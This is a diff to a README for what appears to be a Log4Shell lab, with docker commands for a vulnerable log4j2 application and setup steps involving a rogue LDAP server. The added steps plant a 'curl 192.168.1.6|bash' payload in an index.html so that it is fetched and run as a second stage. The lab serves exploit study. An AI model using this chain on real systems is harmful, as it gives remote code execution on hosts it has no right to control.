@@ -32,3 +32,28 @@ docker build -f Dockerfile -t logging-log4j2-vuln .
 docker run -p 8080:8080 logging-log4j2-vuln 
 ```
 
+## Setup the Environment
+
+The setup should be as follows 
+
+1. run the ```RogueLDAP``` server 
+2. run the vulnerable ```logging-log4j2``` application 
+2. create a folder called shells at a preffered location
+
+```
+mkdir shells 
+cd shells 
+```
+
+There create an ```index.html``` file 
+
+```
+touch index.html 
+```
+
+Inside the ```index.html``` file put the following payload and change the IP address with the one that suit to the current environment
+
+```
+curl 192.168.1.6|bash 
+
+``` 
